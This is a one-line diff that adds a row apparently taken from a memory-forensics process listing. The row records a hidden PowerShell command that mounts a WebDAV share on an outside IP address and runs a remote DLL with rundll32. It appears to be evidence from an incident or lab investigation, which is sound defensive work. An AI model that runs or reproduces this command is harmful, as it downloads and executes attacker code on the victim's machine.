@@ -1,0 +1,1 @@
+111:3692	4120	powershell.exe	0xc90c0358b080	17	-	1	False	2024-07-15 07:00:03.000000 UTC	N/A	\Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe	powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
